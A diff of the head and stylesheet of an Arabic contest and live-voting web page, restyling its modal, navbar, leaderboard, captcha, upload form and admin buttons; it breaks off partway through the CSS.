@@ -3,1174 +3,663 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أمير المترات | المنصة الشاملة لمسابقة وتصويت متر فلينج</title>
+<title>أمير المترات | المعرض العصري والتصويت السحابي المباشر على متر فلينج</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg-canvas: #060d14;
-    --bg-card: #0c1924;
-    --bg-card-elev: #122434;
-    --border-line: #1e3a4c;
-    --emerald: #10b981;
-    --emerald-deep: #047857;
-    --emerald-glow: rgba(16, 185, 129, 0.28);
-    --amber: #f59e0b;
-    --amber-bright: #fbbf24;
-    --amber-glow: rgba(245, 158, 11, 0.3);
-    --danger: #f43f5e;
-    --text-main: #f1f5f9;
-    --text-sub: #94a3b8;
-    --grad-primary: linear-gradient(135deg, #059669 0%, #0f766e 55%, #d97706 100%);
-    --grad-amber: linear-gradient(135deg, #fbbf24 0%, #d97706 100%);
-    --grad-surface: linear-gradient(160deg, #102130 0%, #09131c 100%);
+    --bg-dark: #030712;
+    --surface: #0b1329;
+    --surface-light: #111d3b;
+    --border: #1e294b;
+    --primary: #38bdf8;
+    --primary-glow: rgba(56, 189, 248, 0.4);
+    --gold: #f59e0b;
+    --gold-bright: #fbbf24;
+    --gold-glow: rgba(245, 158, 11, 0.35);
+    --cyan: #06b6d4;
+    --danger: #ef4444;
+    --success: #10b981;
+    --text-white: #f8fafc;
+    --text-muted: #94a3b8;
+    --grad-tech: linear-gradient(135deg, #0284c7 0%, #0369a1 50%, #f59e0b 100%);
+    --grad-gold: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+    --grad-glass: linear-gradient(145deg, rgba(17, 29, 59, 0.9), rgba(11, 19, 41, 0.95));
   }
 
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Cairo', sans-serif;
-  }
-
-  html {
-    scroll-behavior: smooth;
-  }
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+  html { scroll-behavior: smooth; }
 
   body {
-    background-color: var(--bg-canvas);
-    background-image:
-      radial-gradient(circle at 12% 8%, rgba(16, 185, 129, 0.12) 0%, transparent 42%),
-      radial-gradient(circle at 88% 15%, rgba(245, 158, 11, 0.12) 0%, transparent 45%),
-      radial-gradient(circle at 50% 95%, rgba(15, 118, 110, 0.1) 0%, transparent 50%);
-    color: var(--text-main);
-    line-height: 1.75;
+    background-color: var(--bg-dark);
+    background-image: 
+      radial-gradient(circle at 15% 10%, rgba(56, 189, 248, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 85% 20%, rgba(245, 158, 11, 0.12) 0%, transparent 45%),
+      radial-gradient(circle at 50% 90%, rgba(6, 182, 212, 0.08) 0%, transparent 55%);
+    color: var(--text-white);
+    line-height: 1.8;
     overflow-x: hidden;
   }
 
-  /* ===== شريط التنقل الموحد في الصفحة الواحدة ===== */
-  .topbar {
-    position: sticky;
-    top: 0;
-    z-index: 900;
-    background: rgba(6, 13, 20, 0.9);
-    backdrop-filter: blur(16px);
-    border-bottom: 1px solid var(--border-line);
-  }
-
-  .topbar-inner {
-    max-width: 1220px;
-    margin: 0 auto;
-    padding: 12px 20px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 14px;
-    flex-wrap: wrap;
-  }
-
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-weight: 900;
-    font-size: 21px;
-    color: var(--amber-bright);
-  }
-
-  .brand-pill {
-    background: rgba(16, 185, 129, 0.15);
-    border: 1px solid var(--emerald);
-    color: #6ee7b7;
-    font-size: 11.5px;
-    font-weight: 800;
-    padding: 2px 10px;
-    border-radius: 999px;
-  }
-
-  .nav-menu {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    flex-wrap: wrap;
-  }
-
-  .nav-menu a {
-    text-decoration: none;
-    color: var(--text-sub);
-    font-size: 13.5px;
-    font-weight: 800;
-    padding: 7px 14px;
-    border-radius: 10px;
-    transition: 0.2s;
-  }
-
-  .nav-menu a:hover {
-    color: #fff;
-    background: rgba(255, 255, 255, 0.06);
-  }
-
-  .nav-menu a.pill-amber {
-    background: var(--grad-amber);
-    color: #060d14;
-  }
-
-  .nav-menu a.pill-emerald {
-    background: var(--grad-primary);
-    color: #fff;
-  }
-
-  /* ===== ترويسة الصفحة الواحدة ===== */
-  .hero-wrap {
-    max-width: 1220px;
-    margin: 24px auto 0;
-    padding: 0 20px;
-  }
-
-  .hero-panel {
-    background: var(--grad-surface);
-    border: 1.5px solid rgba(245, 158, 11, 0.35);
-    border-radius: 28px;
-    padding: 36px 30px;
-    display: grid;
-    grid-template-columns: 1.25fr 0.75fr;
-    gap: 28px;
-    align-items: center;
-    box-shadow: 0 24px 60px rgba(0, 0, 0, 0.55);
-  }
-
-  .hero-kicker {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: rgba(245, 158, 11, 0.14);
-    border: 1px solid rgba(251, 191, 36, 0.4);
-    color: var(--amber-bright);
-    padding: 5px 15px;
-    border-radius: 999px;
-    font-size: 13px;
-    font-weight: 800;
-    margin-bottom: 14px;
-  }
-
-  .hero-panel h1 {
-    font-size: 38px;
-    font-weight: 900;
-    line-height: 1.25;
-    margin-bottom: 12px;
-  }
-
-  .hero-panel h1 span {
-    background: var(--grad-amber);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-  }
-
-  .hero-panel p {
-    color: var(--text-sub);
-    font-size: 15.5px;
-    margin-bottom: 22px;
-    max-width: 640px;
-  }
-
-  .hero-btns {
-    display: flex;
-    gap: 12px;
-    flex-wrap: wrap;
-  }
-
-  .btn-main-amber {
-    text-decoration: none;
-    background: var(--grad-amber);
-    color: #060d14;
-    font-weight: 900;
-    font-size: 15px;
-    padding: 12px 24px;
-    border-radius: 12px;
-    border: none;
-    cursor: pointer;
-    transition: 0.2s;
-  }
-
-  .btn-main-emerald {
-    text-decoration: none;
-    background: var(--grad-primary);
-    color: #fff;
-    font-weight: 900;
-    font-size: 15px;
-    padding: 12px 24px;
-    border-radius: 12px;
-    border: none;
-    cursor: pointer;
-    transition: 0.2s;
-  }
-
-  .btn-main-amber:hover, .btn-main-emerald:hover {
-    transform: translateY(-2px);
-  }
-
-  .hero-metric-box {
-    background: rgba(6, 13, 20, 0.72);
-    border: 1px solid var(--border-line);
-    border-radius: 22px;
+  /* ===== نافذة التنبيه الفورية ===== */
+  #promoModal {
+    position: fixed; inset: 0;
+    background: rgba(3, 7, 18, 0.88);
+    backdrop-filter: blur(14px);
+    z-index: 9999;
+    display: flex; align-items: center; justify-content: center;
     padding: 20px;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 12px;
+    animation: fadeInModal 0.3s ease forwards;
   }
 
-  .metric-cell {
-    background: var(--bg-card-elev);
-    border: 1px solid rgba(16, 185, 129, 0.22);
-    border-radius: 16px;
-    padding: 16px 12px;
+  @keyframes fadeInModal {
+    from { opacity: 0; transform: scale(0.94); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  .modal-box {
+    background: linear-gradient(160deg, #162242 0%, #0b1329 100%);
+    border: 2px solid var(--gold);
+    border-radius: 32px;
+    padding: 35px 25px;
+    max-width: 480px; width: 100%;
     text-align: center;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.8), 0 0 45px rgba(245,158,11,0.35);
   }
 
-  .metric-cell strong {
-    display: block;
-    font-size: 22px;
-    font-weight: 900;
-    color: var(--amber-bright);
+  .modal-badge {
+    display: inline-block;
+    background: var(--grad-gold);
+    color: #030712;
+    font-weight: 900; font-size: 14px;
+    padding: 6px 20px; border-radius: 30px;
+    margin-bottom: 16px;
   }
 
-  .metric-cell span {
-    font-size: 12px;
-    color: var(--text-sub);
-    font-weight: 700;
-  }
+  .modal-box h2 { font-size: 26px; font-weight: 900; color: var(--gold-bright); margin-bottom: 12px; line-height: 1.3; }
+  .modal-box p { color: #cbd5e1; font-size: 15px; margin-bottom: 24px; }
+  .modal-actions { display: flex; flex-direction: column; gap: 10px; }
 
-  /* ===== الأقسام المجمعة في الصفحة الواحدة ===== */
-  .page-section {
-    max-width: 1220px;
-    margin: 48px auto;
-    padding: 0 20px;
-  }
-
-  .sec-title {
-    display: flex;
-    align-items: baseline;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px;
-    margin-bottom: 22px;
-    padding-bottom: 10px;
-    border-bottom: 1px solid var(--border-line);
-  }
-
-  .sec-title h2 {
-    font-size: 26px;
-    font-weight: 900;
-    color: #fff;
-  }
-
-  .sec-title span {
-    font-size: 13px;
-    font-weight: 800;
-    color: var(--emerald);
-  }
-
-  /* ===== معرض الصور والفئات ===== */
-  .models-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(255px, 1fr));
-    gap: 18px;
-  }
-
-  .model-card {
-    background: var(--grad-surface);
-    border: 1px solid var(--border-line);
-    border-radius: 22px;
-    overflow: hidden;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    transition: 0.22s;
-  }
-
-  .model-card:hover {
-    transform: translateY(-4px);
-    border-color: var(--amber);
-  }
-
-  .model-banner {
-    height: 128px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    background: linear-gradient(135deg, #064e3b 0%, #0f172a 60%, #78350f 100%);
-    border-bottom: 1px solid var(--border-line);
-  }
-
-  .model-emoji {
-    font-size: 52px;
-    filter: drop-shadow(0 8px 16px rgba(0, 0, 0, 0.5));
-  }
-
-  .model-tag {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background: rgba(6, 13, 20, 0.85);
-    border: 1px solid var(--amber);
-    color: var(--amber-bright);
-    font-size: 11px;
-    font-weight: 800;
-    padding: 3px 10px;
-    border-radius: 999px;
-  }
-
-  .model-body {
-    padding: 18px;
-  }
-
-  .model-body h3 {
-    font-size: 18px;
-    font-weight: 900;
-    color: var(--amber-bright);
-    margin-bottom: 6px;
-  }
-
-  .model-body p {
-    font-size: 13.5px;
-    color: var(--text-sub);
-    margin-bottom: 14px;
-  }
-
-  .model-btn {
-    width: 100%;
-    padding: 10px;
-    border-radius: 12px;
-    border: 1px solid var(--emerald);
-    background: rgba(16, 185, 129, 0.14);
-    color: #6ee7b7;
-    font-weight: 800;
-    font-size: 13.5px;
-    cursor: pointer;
+  .modal-btn {
+    background: var(--grad-tech); color: #fff;
+    font-weight: 900; font-size: 16px;
+    padding: 14px 28px; border-radius: 50px;
+    border: none; cursor: pointer; width: 100%;
+    box-shadow: 0 10px 25px var(--primary-glow);
     transition: 0.2s;
   }
+  .modal-btn.secondary {
+    background: rgba(245, 158, 11, 0.15);
+    border: 1.5px solid var(--gold);
+    color: var(--gold-bright);
+    box-shadow: none;
+  }
+  .modal-btn:hover { transform: translateY(-2px); }
 
-  .model-btn:hover {
-    background: var(--emerald);
-    color: #060d14;
+  /* ===== الشريط العلوي ===== */
+  .navbar {
+    position: sticky; top: 15px; z-index: 1000;
+    max-width: 1100px; margin: 0 auto; padding: 0 15px;
   }
 
-  /* ===== لوحة التصويت والترتيب المباشر ===== */
-  .panel-box {
-    background: var(--grad-surface);
-    border: 1.5px solid var(--border-line);
-    border-radius: 26px;
-    padding: 28px;
-    box-shadow: 0 20px 50px rgba(0, 0, 0, 0.45);
+  .nav-box {
+    background: rgba(11, 19, 41, 0.88);
+    backdrop-filter: blur(25px);
+    border: 1px solid rgba(56, 189, 248, 0.3);
+    border-radius: 60px; padding: 12px 28px;
+    display: flex; align-items: center; justify-content: space-between;
+    box-shadow: 0 20px 45px rgba(0, 0, 0, 0.7);
+    flex-wrap: wrap; gap: 12px;
   }
 
-  .status-strip {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 10px;
-    margin-bottom: 18px;
+  .brand-logo {
+    font-size: 23px; font-weight: 900;
+    background: linear-gradient(90deg, #ffffff, var(--cyan));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
   }
 
-  .status-badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: rgba(16, 185, 129, 0.14);
-    border: 1px solid rgba(16, 185, 129, 0.45);
-    color: #6ee7b7;
-    padding: 6px 15px;
-    border-radius: 999px;
-    font-size: 13px;
-    font-weight: 800;
+  .nav-links { display: flex; gap: 8px; flex-wrap: wrap; }
+  .nav-links a {
+    text-decoration: none; color: var(--text-muted);
+    font-size: 14px; font-weight: 700;
+    padding: 8px 16px; border-radius: 30px; transition: 0.2s;
+  }
+  .nav-links a:hover { color: #fff; background: rgba(255, 255, 255, 0.08); }
+  .nav-links a.cta-pill { background: var(--grad-tech); color: #fff; }
+  .nav-links a.vote-pill { background: var(--grad-gold); color: #030712; font-weight: 900; }
+
+  /* ===== الهيدر والأقسام ===== */
+  header { max-width: 1100px; margin: 35px auto 0; padding: 40px 20px 50px; text-align: center; }
+  .store-badge {
+    display: inline-flex; align-items: center; gap: 10px;
+    background: rgba(56, 189, 248, 0.12);
+    border: 1px solid rgba(56, 189, 248, 0.4);
+    color: var(--cyan); padding: 8px 25px; border-radius: 50px;
+    font-size: 15px; font-weight: 800; margin-bottom: 20px;
+  }
+  header h1 { font-size: 46px; font-weight: 900; line-height: 1.25; margin-bottom: 15px; }
+  header h1 span { background: var(--grad-gold); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  header p.subtitle { color: var(--text-muted); font-size: 17.5px; max-width: 750px; margin: 0 auto 25px; }
+
+  section { max-width: 1100px; margin: 60px auto; padding: 0 20px; }
+  .section-head { text-align: center; margin-bottom: 35px; }
+  .section-head .sub { color: var(--cyan); font-size: 14px; font-weight: 800; display: block; margin-bottom: 6px; letter-spacing: 2px; }
+  .section-head h2 { font-size: 34px; font-weight: 900; color: #fff; }
+
+  /* ===== بوابة التصويت المباشر ===== */
+  .voting-section-box {
+    background: linear-gradient(155deg, #121f3d 0%, #091124 100%);
+    border: 2px solid var(--gold);
+    border-radius: 35px; padding: 40px 32px;
+    box-shadow: 0 30px 70px rgba(245, 158, 11, 0.18);
   }
 
-  .dot-live {
-    width: 9px;
-    height: 9px;
-    border-radius: 50%;
-    background: var(--emerald);
-    animation: pulseLive 1.5s infinite;
+  .live-status-bar {
+    display: flex; justify-content: center; align-items: center; gap: 12px;
+    flex-wrap: wrap; margin-bottom: 25px;
   }
 
-  @keyframes pulseLive {
+  .live-pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(16, 185, 129, 0.15);
+    border: 1px solid var(--success);
+    color: #6ee7b7; padding: 7px 18px; border-radius: 50px;
+    font-size: 13px; font-weight: 800; transition: transform 0.2s ease;
+  }
+
+  .pulse-dot {
+    width: 10px; height: 10px; border-radius: 50%;
+    background: var(--success);
+    animation: pulseDot 1.5s infinite;
+  }
+
+  @keyframes pulseDot {
     0% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
-    70% { box-shadow: 0 0 0 9px rgba(16, 185, 129, 0); }
+    70% { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
     100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
   }
 
-  .alert-box {
-    background: rgba(244, 63, 94, 0.12);
-    border: 1px solid rgba(244, 63, 94, 0.55);
-    border-radius: 14px;
-    padding: 12px 16px;
-    color: #fda4af;
-    font-size: 13px;
-    font-weight: 700;
-    margin-bottom: 20px;
+  .vote-grid {
+    display: grid; grid-template-columns: 1fr 1.15fr; gap: 28px; align-items: start;
   }
 
-  .two-col {
-    display: grid;
-    grid-template-columns: 1fr 1.15fr;
-    gap: 24px;
-    align-items: start;
+  .vote-card-panel {
+    background: rgba(5, 11, 26, 0.88);
+    border: 1.5px solid var(--border);
+    border-radius: 24px; padding: 26px;
   }
 
-  .sub-panel {
-    background: rgba(6, 13, 20, 0.78);
-    border: 1px solid var(--border-line);
+  .vote-card-panel h3 { color: var(--gold-bright); font-size: 21px; font-weight: 900; margin-bottom: 8px; }
+  .vote-card-panel p.desc { color: var(--text-muted); font-size: 13.5px; margin-bottom: 18px; }
+
+  .direct-invite-banner {
+    display: none;
+    background: rgba(56, 189, 248, 0.15);
+    border: 1.5px solid var(--cyan);
+    border-radius: 16px; padding: 14px 18px;
+    margin-bottom: 18px; text-align: center;
+  }
+  .direct-invite-banner strong { color: var(--gold-bright); font-size: 16px; }
+
+  .captcha-box {
+    background: rgba(17, 29, 59, 0.9);
+    border: 1px dashed var(--cyan);
+    border-radius: 14px; padding: 12px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; margin-bottom: 16px;
+  }
+  .captcha-question { font-weight: 900; color: var(--cyan); font-size: 16px; direction: ltr; }
+  .captcha-box input { max-width: 110px; text-align: center; font-weight: 900; padding: 10px !important; }
+
+  .search-filter-input {
+    width: 100%; padding: 11px 16px; margin-bottom: 14px;
+    border: 1px solid rgba(56, 189, 248, 0.35);
+    border-radius: 14px; background: #030712; color: #fff; font-size: 13.5px;
+  }
+
+  .leaderboard-list {
+    display: flex; flex-direction: column; gap: 11px;
+    max-height: 540px; overflow-y: auto; padding-left: 4px;
+  }
+
+  .leader-item {
+    background: rgba(17, 29, 59, 0.85);
+    border: 1px solid rgba(56, 189, 248, 0.25);
+    border-radius: 18px; padding: 14px 18px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; transition: 0.2s;
+  }
+
+  .leader-item.top-1 {
+    border: 2px solid var(--gold);
+    background: linear-gradient(90deg, rgba(245, 158, 11, 0.18), rgba(17, 29, 59, 0.92));
+  }
+
+  .leader-info { display: flex; align-items: center; gap: 12px; }
+  .rank-badge {
+    width: 38px; height: 38px; border-radius: 50%;
+    background: var(--surface); border: 1px solid var(--cyan);
+    color: var(--cyan); font-weight: 900;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 15px; flex-shrink: 0;
+  }
+  .leader-item.top-1 .rank-badge { background: var(--grad-gold); color: #030712; border: none; }
+
+  .leader-name { font-weight: 800; font-size: 15.5px; color: #fff; }
+  .leader-meta { font-size: 12px; color: var(--text-muted); }
+  .leader-code { color: var(--gold-bright); font-weight: 800; direction: ltr; display: inline-block; }
+
+  .vote-count-pill {
+    background: rgba(56, 189, 248, 0.15);
+    border: 1px solid var(--cyan);
+    color: var(--cyan); padding: 5px 14px; border-radius: 30px;
+    font-weight: 900; font-size: 14px; white-space: nowrap;
+  }
+
+  .quick-vote-btn {
+    background: var(--grad-gold); color: #030712;
+    border: none; padding: 6px 14px; border-radius: 12px;
+    font-weight: 900; font-size: 12px; cursor: pointer;
+    margin-top: 5px; transition: 0.2s;
+  }
+  .quick-vote-btn:hover { transform: scale(1.05); }
+
+  .admin-only-control {
+    display: none;
+  }
+  body.admin-mode .admin-only-control {
+    display: inline-block;
+  }
+  .admin-del-btn {
+    background: rgba(239, 68, 68, 0.2);
+    border: 1px solid var(--danger);
+    color: #fca5a5; padding: 4px 10px; border-radius: 8px;
+    font-size: 11px; font-weight: 800; cursor: pointer; margin-top: 5px;
+  }
+
+  .store-thanks-card {
+    display: none;
+    margin-top: 18px;
+    background: linear-gradient(145deg, rgba(16, 185, 129, 0.16), rgba(11, 19, 41, 0.95));
+    border: 2px solid var(--success);
     border-radius: 20px;
-    padding: 22px;
+    padding: 20px;
+    text-align: center;
+    animation: fadeInModal 0.3s ease forwards;
   }
-
-  .sub-panel h3 {
+  .store-thanks-card h4 {
+    color: #6ee7b7;
     font-size: 19px;
     font-weight: 900;
-    color: var(--amber-bright);
     margin-bottom: 6px;
   }
-
-  .sub-panel p.hint {
-    font-size: 13px;
-    color: var(--text-sub);
-    margin-bottom: 14px;
-  }
-
-  .invite-banner {
-    display: none;
-    background: rgba(16, 185, 129, 0.16);
-    border: 1px solid var(--emerald);
-    border-radius: 14px;
-    padding: 12px 14px;
-    text-align: center;
-    font-size: 13.5px;
-    margin-bottom: 14px;
-  }
-
-  .invite-banner strong {
-    color: var(--amber-bright);
-  }
-
-  .field {
-    margin-bottom: 13px;
-  }
-
-  .field label {
-    display: block;
-    font-size: 13px;
-    font-weight: 800;
+  .store-thanks-card p {
     color: #e2e8f0;
-    margin-bottom: 5px;
+    font-size: 14px;
+    line-height: 1.7;
   }
+  .store-thanks-brand {
+    display: inline-block;
+    margin-top: 10px;
+    background: var(--grad-gold);
+    color: #030712;
+    font-weight: 900;
+    font-size: 13px;
+    padding: 5px 16px;
+    border-radius: 30px;
+  }
+
+  /* ===== نماذج الإدخال ===== */
+  .form-container {
+    background: var(--grad-glass);
+    border: 2px solid rgba(56, 189, 248, 0.4);
+    border-radius: 35px; padding: 42px;
+    box-shadow: 0 30px 65px rgba(0, 0, 0, 0.75);
+  }
+
+  .form-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 18px; }
+  .field.full { grid-column: 1 / -1; }
+  .field { margin-bottom: 14px; }
+  .field label { display: block; font-weight: 700; color: #e2e8f0; margin-bottom: 6px; font-size: 13.5px; }
 
   .field input, .field select, .field textarea {
-    width: 100%;
-    padding: 12px 14px;
-    border-radius: 12px;
-    border: 1.5px solid var(--border-line);
-    background: #07111a;
-    color: #fff;
-    font-size: 14px;
-    transition: 0.2s;
+    width: 100%; padding: 14px 16px;
+    border: 1.5px solid var(--border); border-radius: 15px;
+    font-size: 14.5px; background: #050b1a; color: #fff; transition: 0.2s;
   }
-
   .field input:focus, .field select:focus, .field textarea:focus {
-    outline: none;
-    border-color: var(--emerald);
+    outline: none; border-color: var(--cyan);
+    box-shadow: 0 0 0 4px rgba(6, 182, 212, 0.2);
+  }
+  .field textarea { min-height: 90px; resize: vertical; }
+
+  .password-wrap { position: relative; }
+  .toggle-pass {
+    position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+    background: none; border: none; color: var(--text-muted);
+    cursor: pointer; font-size: 13px; font-weight: 700;
   }
 
-  .field textarea {
-    min-height: 80px;
-    resize: vertical;
-  }
-
-  .pass-wrap {
-    position: relative;
-  }
-
-  .pass-btn {
-    position: absolute;
-    left: 12px;
-    top: 50%;
-    transform: translateY(-50%);
-    background: none;
-    border: none;
-    color: var(--text-sub);
-    font-size: 12.5px;
-    font-weight: 800;
-    cursor: pointer;
-  }
-
-  .file-drop {
-    background: #07111a;
-    border: 1.5px dashed rgba(251, 191, 36, 0.55);
-    border-radius: 14px;
-    padding: 14px;
-    text-align: center;
-    cursor: pointer;
-    transition: 0.2s;
-  }
-
-  .file-drop:hover {
-    border-color: var(--amber-bright);
-  }
-
-  .file-drop input[type="file"] {
-    display: none;
-  }
-
-  .file-drop .f-title {
-    display: block;
-    font-size: 13.5px;
-    font-weight: 800;
-    color: var(--amber-bright);
-  }
-
-  .file-drop .f-sub {
-    display: block;
-    font-size: 11.5px;
-    color: var(--text-sub);
-  }
-
-  .img-prev {
-    display: none;
-    max-width: 115px;
-    max-height: 115px;
-    border-radius: 10px;
-    margin: 10px auto 0;
-    border: 1.5px solid var(--amber);
-    object-fit: cover;
-  }
-
-  .captcha-row {
-    background: var(--bg-card-elev);
-    border: 1px solid var(--border-line);
-    border-radius: 12px;
-    padding: 10px 14px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 10px;
-    margin-bottom: 14px;
-  }
-
-  .captcha-row span {
-    font-weight: 900;
-    color: var(--amber-bright);
-    direction: ltr;
-  }
-
-  .captcha-row input {
-    max-width: 105px;
-    text-align: center;
-    font-weight: 900;
-    padding: 8px !important;
-  }
-
-  .btn-submit {
-    width: 100%;
-    padding: 14px;
-    border: none;
-    border-radius: 14px;
-    font-size: 16px;
-    font-weight: 900;
-    cursor: pointer;
-    transition: 0.2s;
-  }
-
-  .btn-submit.amber {
-    background: var(--grad-amber);
-    color: #060d14;
-  }
-
-  .btn-submit.emerald {
-    background: var(--grad-primary);
-    color: #fff;
-  }
-
-  .btn-submit:disabled {
-    opacity: 0.6;
-    cursor: not-allowed;
-  }
-
-  .feedback {
-    display: none;
-    margin-top: 12px;
-    padding: 12px;
-    border-radius: 12px;
-    text-align: center;
-    font-size: 13.5px;
-    font-weight: 800;
-  }
-
-  .feedback.err {
-    display: block;
-    background: rgba(244, 63, 94, 0.16);
+  .warning-notice {
+    background: rgba(239, 68, 68, 0.12);
     border: 1px solid var(--danger);
-    color: #fda4af;
+    border-radius: 14px; padding: 14px 18px; margin-bottom: 15px;
+    display: flex; align-items: flex-start; gap: 12px;
+  }
+  .warning-notice p { color: #fca5a5; font-size: 13px; font-weight: 700; line-height: 1.65; }
+
+  .upload-box {
+    background: rgba(5, 11, 26, 0.9);
+    border: 2px dashed rgba(245, 158, 11, 0.6);
+    border-radius: 20px; padding: 18px; text-align: center;
+    cursor: pointer; transition: 0.2s; margin-bottom: 14px;
+  }
+  .upload-box:hover { border-color: var(--gold); }
+  .upload-box input[type="file"] { display: none; }
+  .upload-label { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
+  .upload-icon { font-size: 32px; }
+  .upload-text { font-weight: 800; font-size: 14.5px; color: var(--gold-bright); }
+  .upload-sub { font-size: 12px; color: var(--text-muted); }
+
+  .preview-img {
+    display: none; max-width: 130px; max-height: 130px;
+    border-radius: 12px; margin: 12px auto 0;
+    border: 2px solid var(--gold); object-fit: cover;
   }
 
-  .feedback.ok {
-    display: block;
-    background: rgba(16, 185, 129, 0.16);
-    border: 1px solid var(--emerald);
-    color: #6ee7b7;
+  .btn-enter {
+    width: 100%; margin-top: 14px; padding: 17px;
+    border: none; border-radius: 18px;
+    background: var(--grad-tech); color: #fff;
+    font-size: 19px; font-weight: 900; cursor: pointer;
+    box-shadow: 0 14px 35px var(--primary-glow); transition: 0.2s;
   }
+  .btn-enter.gold-btn { background: var(--grad-gold); color: #030712; box-shadow: 0 14px 35px var(--gold-glow); }
+  .btn-enter:hover { transform: translateY(-2px); }
+  .btn-enter:disabled { opacity: 0.6; cursor: not-allowed; }
 
-  .thanks-box {
-    display: none;
-    margin-top: 14px;
-    background: rgba(16, 185, 129, 0.12);
-    border: 1.5px solid var(--emerald);
-    border-radius: 16px;
-    padding: 16px;
-    text-align: center;
+  .msg {
+    display: none; margin-top: 16px; padding: 15px;
+    border-radius: 15px; text-align: center; font-weight: 700; font-size: 14px;
   }
+  .err { display: block; background: rgba(239, 35, 60, 0.18); color: #ff8fa3; border: 1px solid #ef233c; }
+  .ok-msg { display: block; background: rgba(16, 185, 129, 0.18); color: #6ee7b7; border: 1px solid var(--success); }
 
-  .thanks-box h4 {
-    color: #6ee7b7;
-    font-size: 16px;
-    font-weight: 900;
-    margin-bottom: 4px;
+  #ticketBox {
+    display: none; text-align: center; padding: 40px 22px;
+    background: linear-gradient(145deg, #062338 0%, #030d1a 100%);
+    border: 2px dashed var(--cyan); border-radius: 30px;
   }
-
-  .thanks-box p {
+  .ticket-code {
+    display: inline-block; background: rgba(245, 158, 11, 0.15);
+    border: 2px solid var(--gold); color: var(--gold);
+    font-size: 32px; font-weight: 900; padding: 12px 36px;
+    border-radius: 20px; margin: 14px 0; letter-spacing: 3px; direction: ltr;
+  }
+  .share-message-preview {
+    background: rgba(5, 11, 26, 0.95);
+    border: 1px solid rgba(56, 189, 248, 0.45);
     color: #e2e8f0;
-    font-size: 13px;
-  }
-
-  /* ===== قائمة المتصدرين ===== */
-  .search-box {
-    width: 100%;
-    padding: 10px 14px;
-    border-radius: 12px;
-    border: 1px solid var(--border-line);
-    background: #07111a;
-    color: #fff;
-    font-size: 13.5px;
-    margin-bottom: 12px;
-  }
-
-  .board-scroll {
-    max-height: 530px;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    padding-left: 4px;
-  }
-
-  .board-row {
-    background: var(--bg-card-elev);
-    border: 1px solid var(--border-line);
-    border-radius: 14px;
-    padding: 12px 14px;
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 10px;
-  }
-
-  .board-row.top-rank {
-    border-color: var(--amber);
-    background: linear-gradient(90deg, rgba(245, 158, 11, 0.16), rgba(18, 36, 52, 0.95));
-  }
-
-  .row-left {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-
-  .rank-circle {
-    width: 34px;
-    height: 34px;
-    border-radius: 50%;
-    background: #07111a;
-    border: 1px solid var(--emerald);
-    color: #6ee7b7;
-    font-weight: 900;
-    font-size: 13.5px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    flex-shrink: 0;
-  }
-
-  .board-row.top-rank .rank-circle {
-    background: var(--grad-amber);
-    color: #060d14;
-    border: none;
-  }
-
-  .row-name {
-    font-weight: 800;
-    font-size: 14.5px;
-    color: #fff;
-  }
-
-  .row-sub {
-    font-size: 12px;
-    color: var(--text-sub);
-  }
-
-  .row-code {
-    color: var(--amber-bright);
-    font-weight: 800;
-    direction: ltr;
-    display: inline-block;
-  }
-
-  .votes-badge {
-    background: rgba(16, 185, 129, 0.16);
-    border: 1px solid rgba(16, 185, 129, 0.45);
-    color: #6ee7b7;
-    padding: 4px 12px;
-    border-radius: 999px;
-    font-size: 13px;
-    font-weight: 900;
-    white-space: nowrap;
-  }
-
-  .vote-mini-btn {
-    margin-top: 5px;
-    background: var(--grad-amber);
-    color: #060d14;
-    border: none;
-    border-radius: 8px;
-    padding: 4px 11px;
-    font-size: 11.5px;
-    font-weight: 900;
-    cursor: pointer;
-  }
-
-  .admin-ctrl {
-    display: none;
-  }
-
-  body.admin-on .admin-ctrl {
-    display: inline-block;
-  }
-
-  .del-btn {
-    margin-top: 5px;
-    background: rgba(244, 63, 94, 0.2);
-    border: 1px solid var(--danger);
